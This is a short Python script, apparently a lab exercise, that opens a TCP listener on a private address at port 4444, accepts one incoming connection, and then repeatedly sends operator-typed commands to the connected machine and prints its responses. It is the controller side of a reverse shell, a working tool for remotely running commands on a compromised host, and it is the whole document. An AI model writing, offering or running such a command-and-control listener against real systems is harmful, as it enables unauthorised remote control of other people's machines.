import socket 

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "192.168.64.1"
port = 4444

server.bind((host, port))
server.listen()

client, clientAddr = server.accept()

while True:
    command = input("Enter command: ")
    client.send(command.encode())
    resp = client.recv(1024).decode()  
    print(resp)
